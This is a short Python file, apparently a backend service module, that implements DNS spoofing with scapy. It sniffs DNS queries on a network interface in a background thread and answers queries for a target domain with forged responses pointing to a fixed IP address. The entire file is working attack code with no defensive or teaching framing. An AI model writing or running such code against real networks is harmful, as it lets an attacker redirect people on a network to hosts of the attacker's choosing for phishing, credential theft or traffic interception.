# backend/services/dns_spoofing.py

from scapy.all import *
import threading

target_domain = "example.com"
fake_ip = "192.168.1.100"

def dns_spoof(pkt):
    if pkt.haslayer(DNSQR) and target_domain in pkt[DNSQR].qname.decode():
        spoofed = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                  UDP(dport=pkt[UDP].sport, sport=53) / \
                  DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                      an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=fake_ip))
        send(spoofed, verbose=0)

def start_dns_spoofing(interface="eth0"):
    threading.Thread(target=lambda: sniff(filter="udp port 53", iface=interface, prn=dns_spoof), daemon=True).start()
    return {"status": "DNS spoofing started"}

